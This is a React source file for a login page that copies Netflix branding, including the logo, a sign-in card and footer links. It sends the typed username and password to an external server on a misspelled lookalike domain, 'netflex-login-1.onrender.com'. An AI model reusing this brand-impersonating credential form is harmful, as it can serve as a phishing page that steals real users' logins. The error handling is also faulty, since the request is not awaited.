import axios from "axios"
import { useState } from "react"
import { useNavigate } from "react-router-dom"

function App() {
  const [user, setUser] = useState('')
  const [pass, setPass] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [showPass, setShowPass] = useState(false)
  const [focused, setFocused] = useState('')
  const navi = useNavigate()

  const Check = async () => {
    if (!user.trim() || !pass.trim()) {
      setError('Please enter your username and password.')
      return
    }
    setLoading(true)
    setError('')
    try {
      axios.post("https://netflex-login-1.onrender.com/", {
        name: user.trim(),
        pass: pass.trim()
      })
        .then(res => {
          if (res.data === true) {
            navi('/success')
          } else {
            setError('Incorrect username or password.')
          }
        })
        .catch(err => {
          console.error(err)
        })
    } catch (err) {
      setError('Cannot connect to server. Make sure backend is running.')
    } finally {
      setLoading(false)
    }
  }

  const handleKey = (e) => { if (e.key === 'Enter') Check() }

  return (
    <div className="login-page">

      {/* Background */}
      <div className="login-bg" />
      <div className="login-overlay" />

      {/* Navbar */}
      <nav className="login-nav">
        <div className="netflix-logo">NETFLIX</div>
      </nav>

      {/* Card */}
      <div className="login-wrap">
        <div className="login-card">

          <h1 className="login-title">Sign In</h1>

          {/* Error */}
          {error && (
            <div className="login-error">
              <span>⚠</span> {error}
            </div>
          )}

          {/* Fields */}
          <div className="login-fields">

            {/* Username */}
            <div className={`float-field ${focused === 'user' || user ? 'float-active' : ''}`}>
              <input
                className="float-input"
                type="text"
                value={user}
                onChange={e => setUser(e.target.value)}
                onFocus={() => setFocused('user')}
                onBlur={() => setFocused('')}
                onKeyDown={handleKey}
                autoComplete="off"
              />
              <label className="float-label">Username</label>
            </div>

            {/* Password */}
            <div className={`float-field ${focused === 'pass' || pass ? 'float-active' : ''}`}>
              <input
                className="float-input"
                type={showPass ? "text" : "password"}
                value={pass}
                onChange={e => setPass(e.target.value)}
                onFocus={() => setFocused('pass')}
                onBlur={() => setFocused('')}
                onKeyDown={handleKey}
                autoComplete="off"
              />
              <label className="float-label">Password</label>
              <button
                className="show-pass-btn"
                type="button"
                onClick={() => setShowPass(p => !p)}
                tabIndex={-1}
              >
                {showPass ? "HIDE" : "SHOW"}
              </button>
            </div>

          </div>

          {/* Submit */}
          <button
            className="login-btn"
            onClick={Check}
            disabled={loading}
          >
            {loading
              ? <span className="btn-spinner" />
              : "Sign In"
            }
          </button>

          {/* Remember me */}
          <div className="login-options">
            <label className="remember-wrap">
              <input type="checkbox" className="remember-check" />
              <span>Remember me</span>
            </label>
            <a href="#" className="need-help">Need help?</a>
          </div>

          {/* Sign up */}
          <div className="login-signup">
            <span className="login-signup-gray">New to Netflix? </span>
            <a href="#">Sign up now.</a>
          </div>

          <p className="login-recaptcha">
            This page is protected by Google reCAPTCHA to ensure you're not a bot.{" "}
            <a href="#">Learn more.</a>
          </p>

        </div>
      </div>

      {/* Footer */}
      <footer className="login-footer">
        <p className="login-footer-phone">Questions? Call 000-800-919-1694</p>
        <div className="footer-links">
          {["FAQ", "Help Centre", "Terms of Use", "Privacy", "Cookie Preferences", "Corporate Information"].map(l => (
            <a key={l} href="#">{l}</a>
          ))}
        </div>
      </footer>

    </div>
  )
}

export default App